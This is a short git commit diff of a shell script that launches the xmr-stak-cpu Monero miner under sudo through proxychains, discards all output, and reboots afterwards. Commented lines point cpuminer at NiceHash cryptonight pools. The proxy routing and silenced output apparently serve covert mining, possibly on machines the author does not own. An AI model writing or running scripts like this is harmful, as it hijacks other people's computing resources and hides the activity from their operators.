8b78ada4c4c0d89d88f6b89e1c05dae1a62c5454
smithinoz <smithinoz@users.noreply.github.com>
2017-06-18 20:34:22 +1000

    Update a.sh

--- a.sh
+++ a.sh
@@ -15,9 +15,10 @@ sudo chmod +x /m/test01/proxychains/proxychains4
 sudo chmod +x /m/test01/xmr/xmr-stak-cpu
 sudo chmod +x /m/test01/proxychains/libproxychains4.so
 
-while true; do
+#while true; do
+cd /m/test01/xmr/
 sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
-#sudo reboot
+sudo reboot
 # sudo ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.usa.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
 # sudo ./cpuminer -a cryptonight -o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u $VAR_ADDRESS -p x -x $VAR_PROXY -R 1 -r 10 --api-bind 0
-done
+#done
